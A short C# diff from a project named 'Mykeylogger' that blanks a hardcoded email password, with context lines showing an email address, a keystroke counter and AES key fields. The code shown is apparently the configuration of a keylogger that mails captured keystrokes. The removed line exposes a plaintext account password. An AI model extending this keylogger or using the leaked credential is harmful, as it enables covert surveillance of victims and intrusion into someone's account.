@@ -14,7 +14,7 @@ namespace Mykeylogger
     class Program
     {
         const string EMAIL_ADDRESS = "Projektinzynierski@outlook.com";   
-        const string EMAIL_PASSWORD = "Inzynierka2023";                  
+        const string EMAIL_PASSWORD = "";                  
         static long numberOfKeystrokes = 0;
         static byte[] AES_KEY;
         static byte[] AES_IV;
